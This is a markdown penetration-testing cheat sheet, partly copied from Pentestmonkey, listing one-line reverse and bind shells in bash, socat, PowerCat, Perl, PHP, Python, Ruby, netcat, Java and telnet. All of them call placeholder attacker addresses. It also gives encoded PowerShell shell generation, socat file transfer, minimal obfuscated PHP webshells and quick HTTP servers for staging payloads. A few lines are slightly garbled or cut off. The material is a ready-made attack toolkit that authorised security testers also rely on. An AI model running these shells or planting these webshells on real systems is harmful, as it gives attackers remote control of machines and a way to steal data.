# Sockets & Shellz
======
#### Ref
Many copied from <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">Pentestmonkey: Reverse Shell Cheat Sheet</a>

##  Socat
------
#### socat
```

socat file:`tty`,raw,echo=0 tcp-listen:4444 (listener)
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:127.0.0.1:4444 (client)
```
#### Connect to remote POP3 Server
socat - TCP4:10.1.1.1:110
#### Create a listener on port 443
sudo socat TCP4-LISTEN:443 STDOUT
#### Transfer a File
sudo socat TCP4-LISTEN:443,fork file:secret.txt
#### Download a File
socat TCP4:10.1.1.1:443 file:new_secrets.txt,create
#### Socat Listener
socat -d -d TCP4-LISTEN:443
#### Socat Reverse Shell
socat TCP4:10.1.1.1:443 EXEC:/bin/bash
#### Socat Encrypted Bind
socat OPENSSL-LISTEN:443,cert=priv.pem,verify=0,fork EXE C:/bin/bash
#### Socat Connect to Encrypted Bind
socat - OPENSSL:10.1.1.1:443,verify=0

## PowerCat
------
#### Import
Import-Module ./powercat.ps1
#### Send File to Remote Listener
powercat -c 10.1.1.11 -p 443 -i C:\tmp\file-to-transfer.ps1
#### Bind to Local Application (reverse)
powercat -c 10.1.1.1 -p 443 -e cmd.exe
#### Bind to Local Application (bind)
powercat -l -p 443 -e cmd.exe
#### Generate PowerShell Rev Shell
powercat -c 10.1.1.1 -p 443 -e cmd.exe -g > reverseshell.ps1
#### Generate Encoded PowerShell Rev Shell
+ powercat -c 10.1.1.1 -p 443 -e cmd.exe -ge > encodedreverseshell.ps1
+  powershell -E (Write-Host encodedreverseshell.ps1)

#### Bash
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
#### Bash
0<&196;exec 196<>/dev/tcp/<IP>/443; sh <&196 >&196 2>&196 
#### Perl
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
#### PHP
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
#### Powershell (reverse)
+ $client = New-Object System.Net.Sockets.TCPClient("192.168.119.140",4444)
+  $stream = $client.GetStream()
+  [byte[]]$bytes = 0..65535|%{0}
+ while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
+ $sendback = (iex $data 2<&1 | Out-String )
+ $sendback2 = $sendback + "PS " + (pwd).Path + "> "
+ $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
+ $stream.Write($sendbyte,0,$sendbyte.Length)
+ $stream.Flush()}
+ $client.Close()

#### PowerShell (Bind)
+ $listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443)
+  $listener.start()
+  $client = $listener.AcceptTcpClient()
+  $stream = $client.GetStream()
+  [byte[]]

#### Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
#### Ruby
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
#### Ruby (non /bin/sh)
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
#### Ruby (Windows)
ruby -rsocket -e 'c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
#### Netcat
nc -e /bin/sh 10.0.0.1 1234
#### OpenBSD Netcat
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
#### Java
```

r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()

```
#### Telnet
rm -f /tmp/p; mknod /tmp/p p && telnet attackerip 4444 0/tmp/p
#### Telnet
telnet attackerip 4444 | /bin/bash | telnet attackerip 4445   # Remember to listen on your machine also on port 4445/tcp

## Webshells
------
#### PHP (standard)
<?php echo system($_GET['h00p']);?>
#### PHP (tiniest)
<?=`{${~a0b8baab}[a0]}`;
#### PHP (conditional tiniest)
<?`$_GET[_]`;

## HTTP Servers
------
#### Python2
python -m SimpleHTTPServer 8888
#### Python3
python -m http.server --bind 0.0.0.0 8888
#### php
php -S 0.0.0.0:8888
#### Ruby
ruby -run -e httpd . -p 8888
#### Busybox
busybox httpd -f -p 8888
